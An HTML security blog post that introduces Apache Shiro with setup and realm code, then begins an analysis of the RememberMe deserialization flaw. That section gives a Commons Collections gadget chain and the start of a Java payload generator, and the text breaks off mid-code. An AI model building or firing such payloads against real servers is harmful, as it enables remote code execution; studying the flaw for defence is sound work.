@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Shiro SecurityIntroductionArchitectureShiro is a Java security framework under Apache that implements authentication, authorization, cryptography, session management.   Subject:  Subject is the object">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Shiro Security">
+<meta property="og:url" content="http://example.com/2024/06/05/Shiro-Security/index.html">
+<meta property="og:site_name" content="P3ngu1nW">
+<meta property="og:description" content="Shiro SecurityIntroductionArchitectureShiro is a Java security framework under Apache that implements authentication, authorization, cryptography, session management.   Subject:  Subject is the object">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/ShiroArchitecture.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606100657560.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606102609020.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606103821452.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606104408343.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606134934297.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606135401638.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606135442161.png">
+<meta property="og:image" content="http://example.com/2024/06/05/Shiro-Security/image-20240606140314753.png">
+<meta property="article:published_time" content="2024-06-05T06:34:13.000Z">
+<meta property="article:modified_time" content="2024-06-06T06:21:39.020Z">
+<meta property="article:author" content="P3ngu1nW">
+<meta property="article:tag" content="Java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2024/06/05/Shiro-Security/ShiroArchitecture.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Shiro Security</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/12/06/AspectJWeaver/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/06/05/Shiro-Security/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/06/05/Shiro-Security/&text=Shiro Security"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/06/05/Shiro-Security/&is_video=false&description=Shiro Security"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Shiro Security&body=Check out this article: http://example.com/2024/06/05/Shiro-Security/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/06/05/Shiro-Security/&title=Shiro Security"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/06/05/Shiro-Security/&name=Shiro Security&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/06/05/Shiro-Security/&t=Shiro Security"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Shiro-Security"><span class="toc-number">1.</span> <span class="toc-text">Shiro Security</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Architecture"><span class="toc-number">1.1.1.</span> <span class="toc-text">Architecture</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Quick-Start"><span class="toc-number">1.1.2.</span> <span class="toc-text">Quick Start</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Experiment-Setup"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Authentication"><span class="toc-number">1.1.2.2.</span> <span class="toc-text">Authentication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Custom-Realm"><span class="toc-number">1.1.2.3.</span> <span class="toc-text">Custom Realm</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Authorization"><span class="toc-number">1.1.2.4.</span> <span class="toc-text">Authorization</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Overview"><span class="toc-number">1.1.3.</span> <span class="toc-text">Overview</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Remember-Me-Deserialization"><span class="toc-number">1.2.</span> <span class="toc-text">Remember Me Deserialization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#With-CC"><span class="toc-number">1.2.1.</span> <span class="toc-text">With CC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#With-CB"><span class="toc-number">1.2.2.</span> <span class="toc-text">With CB</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2010-3863-Request-URI-ByPass"><span class="toc-number">1.3.</span> <span class="toc-text">CVE-2010-3863 Request URI ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Experiment-Setup-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Analyse"><span class="toc-number">1.3.2.</span> <span class="toc-text">Code Analyse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2016-6802-Context-Path-ByPass"><span class="toc-number">1.4.</span> <span class="toc-text">CVE-2016-6802 Context Path ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Experiment-Setup-2"><span class="toc-number">1.4.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Code-Analyse-1"><span class="toc-number">1.4.2.</span> <span class="toc-text">Code Analyse</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2020-Request-URI-ByPass"><span class="toc-number">1.5.</span> <span class="toc-text">CVE-2020-* Request URI ByPass</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Experiment-Setup-3"><span class="toc-number">1.5.1.</span> <span class="toc-text">Experiment Setup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit"><span class="toc-number">1.5.2.</span> <span class="toc-text">Exploit</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">1.6.</span> <span class="toc-text">Reference</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Shiro Security
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">P3ngu1nW</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-06-05T06:34:13.000Z" class="dt-published" itemprop="datePublished">2024-06-05</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Java/" rel="tag">Java</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Shiro-Security"><a href="#Shiro-Security" class="headerlink" title="Shiro Security"></a>Shiro Security</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><h3 id="Architecture"><a href="#Architecture" class="headerlink" title="Architecture"></a>Architecture</h3><p>Shiro is a Java security framework under Apache that implements authentication, authorization, cryptography, session management.</p>
+<img src="/2024/06/05/Shiro-Security/ShiroArchitecture.png" class title="Shiro Architecture Diagram">
+
+<p><strong>Subject</strong>: </p>
+<p>Subject is the object that interacts with the current application and is also the object that Shiro manages security for.</p>
+<p><strong>SecurityManager</strong>:</p>
+<p>SecurityManager is the core of Shiro and is responsible for managing all subjects.</p>
+<p><strong>Authenticator</strong>:</p>
+<p>Authenticate the user when they log in</p>
+<p><strong>Authorizer</strong>:</p>
+<p>When accessing a function, the authorizer determines whether the user has the permission to operate this function.</p>
+<p><strong>Realm</strong>:</p>
+<p>SecurityManager needs to obtain user data through Realm when performing security authentication and authorization.</p>
+<p><strong>SessionManager</strong>:</p>
+<p>Shiro’s session management does not rely on the session of the Web container, so Shiro can be used in non-web applications, and can also centralize the session management of distributed applications to achieve single sign-on.</p>
+<p><strong>SessionDAO</strong>:</p>
+<p>A set of interfaces for Session operations.</p>
+<p><strong>CacheManager</strong>:</p>
+<p>Storing user data in cache.</p>
+<p><strong>Cryptography</strong>:</p>
+<p>Shiro provides a set of encryption&#x2F;decryption components to facilitate development.</p>
+<h3 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h3><h4 id="Experiment-Setup"><a href="#Experiment-Setup" class="headerlink" title="Experiment Setup"></a>Experiment Setup</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.shiro<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>shiro-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.13.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Authentication"><a href="#Authentication" class="headerlink" title="Authentication"></a>Authentication</h4><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shiro.ini</span></span><br><span class="line"><span class="section">[users]</span></span><br><span class="line">admin:123456</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.UsernamePasswordToken;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.config.IniSecurityManagerFactory;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.mgt.SecurityManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.Factory;</span><br><span class="line"><span class="keyword">import</span> org.junit.Test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloShiro</span> &#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">shiroLogin</span><span class="params">()</span>&#123;</span><br><span class="line">        Factory&lt;SecurityManager&gt; factory = <span class="keyword">new</span> <span class="title class_">IniSecurityManagerFactory</span>(<span class="string">&quot;classpath:shiro.ini&quot;</span>);</span><br><span class="line">        <span class="type">SecurityManager</span> <span class="variable">securityManager</span> <span class="operator">=</span> factory.getInstance();</span><br><span class="line">        SecurityUtils.setSecurityManager((SecurityManager) securityManager);</span><br><span class="line">        <span class="type">Subject</span> <span class="variable">subject</span> <span class="operator">=</span> SecurityUtils.getSubject();</span><br><span class="line">        <span class="type">UsernamePasswordToken</span> <span class="variable">token</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UsernamePasswordToken</span>(<span class="string">&quot;admin&quot;</span>, <span class="string">&quot;123456&quot;</span>);</span><br><span class="line">        subject.login(token);</span><br><span class="line">        <span class="keyword">if</span>(subject.isAuthenticated()) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Login Success&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Login Failure&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>User information such as username and password is encapsulated as a token</li>
+<li>The Subject obtains the token and passes it to the SecurityManager</li>
+<li>SecurityManager delegates token to Authenticator for identity authentication</li>
+<li>Authenticator compares the token with Realm to verify the legitimacy of the token</li>
+</ul>
+<h4 id="Custom-Realm"><a href="#Custom-Realm" class="headerlink" title="Custom Realm"></a>Custom Realm</h4><p>We can customize realm to get user data.</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Service;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">SecurityService</span> &#123;</span><br><span class="line">    String <span class="title function_">findPasswordByLoginName</span><span class="params">(String loginName)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Service.Impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Service.SecurityService;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SecurityServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">SecurityService</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">findPasswordByLoginName</span><span class="params">(String loginName)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> loginName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Realm;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authc.*;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.authz.AuthorizationInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.realm.AuthorizingRealm;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.PrincipalCollection;</span><br><span class="line"><span class="keyword">import</span> Service.SecurityService;</span><br><span class="line"><span class="keyword">import</span> Service.Impl.SecurityServiceImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyRealm</span> <span class="keyword">extends</span> <span class="title class_">AuthorizingRealm</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthorizationInfo <span class="title function_">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> AuthenticationInfo <span class="title function_">doGetAuthenticationInfo</span><span class="params">(AuthenticationToken token)</span> <span class="keyword">throws</span> AuthenticationException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">loginName</span> <span class="operator">=</span> (String)token.getPrincipal();</span><br><span class="line">        <span class="type">SecurityService</span> <span class="variable">service</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecurityServiceImpl</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">password</span> <span class="operator">=</span> service.findPasswordByLoginName(loginName);</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;&quot;</span>.equals(password)||password==<span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnknownAccountException</span>(<span class="string">&quot;User Does not exist&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="keyword">new</span> <span class="title class_">SimpleAuthenticationInfo</span>(loginName,password,getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># shiro.ini</span></span><br><span class="line"><span class="section">[main]</span></span><br><span class="line"><span class="attr">definitionRealm</span>=realm.MyRealm</span><br><span class="line"><span class="attr">securityManager.realms</span>=<span class="variable">$definitionRealm</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="Authorization"><a href="#Authorization" class="headerlink" title="Authorization"></a>Authorization</h4><p>We need to overwrite the <code>doGetAuthorizationInfo</code> function</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> AuthorizationInfo <span class="title function_">doGetAuthorizationInfo</span><span class="params">(PrincipalCollection principalCollection)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">loginName</span> <span class="operator">=</span> (String) principalCollection.getPrimaryPrincipal();</span><br><span class="line">    <span class="type">SecurityService</span> <span class="variable">securityService</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecurityServiceImpl</span>();</span><br><span class="line">    List&lt;String&gt; roles = securityService.findRoleByloginName(loginName);</span><br><span class="line">    List&lt;String&gt; permissions = securityService.findPermissionByloginName(loginName);</span><br><span class="line">    <span class="type">SimpleAuthorizationInfo</span> <span class="variable">authorizationInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleAuthorizationInfo</span>();</span><br><span class="line">    authorizationInfo.addRoles(roles);</span><br><span class="line">    authorizationInfo.addStringPermissions(permissions);</span><br><span class="line">    <span class="keyword">return</span> authorizationInfo;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p>Shiro’s security issues are mainly divided into two categories, one is the deserialization vulnerability, the other is the URL bypass vulnerability. The core of deserialization is the hard-coded AES key, and the core of URL bypass is actually the inconsistency between the URI obtained by Shiro and the actual accessed URI.</p>
+<h2 id="Remember-Me-Deserialization"><a href="#Remember-Me-Deserialization" class="headerlink" title="Remember Me Deserialization"></a>Remember Me Deserialization</h2><h3 id="With-CC"><a href="#With-CC" class="headerlink" title="With CC"></a>With CC</h3><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readObject =&gt; HashMap.hash =&gt; key.hashCode TiedMapEntry.hashCode =&gt; TiedMapEntry.getValue =&gt; map.get(key) =&gt; LazyMap.get(TemplatesImpl) =&gt; InvokerTransformer.transform(TemplatesImpl) =&gt; newTransformer()</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.crypto.AesCipherService;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.util.ByteSource;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GenePayLoad</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object newValue)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> clazz.getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span 